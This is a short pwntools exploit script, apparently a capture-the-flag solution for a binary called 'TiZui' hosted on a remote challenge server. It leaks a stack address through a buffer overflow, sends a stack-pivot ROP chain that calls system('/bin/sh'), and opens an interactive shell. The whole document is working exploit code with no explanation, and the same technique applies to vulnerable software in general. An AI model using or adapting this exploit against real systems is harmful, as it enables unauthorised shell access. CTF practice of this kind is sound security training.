from pwn import *

# p = process('./TiZui')
p = remote('challenges.hazmat.buptmerak.cn', 20198)

leave_ret = 0x400733
system_addr = 0x400570
pop_rdi_ret = 0x4006CA

# gdb.attach(p)
p.send(b'a' * 47 + b'b')
p.recvuntil(b'b')
buf = u64(p.recv(6).ljust(8, b'\x00')) - 0x40
print(hex(buf))

payload = b'/bin/sh\x00' + p64(pop_rdi_ret) + p64(buf) + p64(system_addr)  + p64(0) * 2 + p64(buf) + p64(leave_ret)
# gdb.attach(p)
p.send(payload)

p.interactive()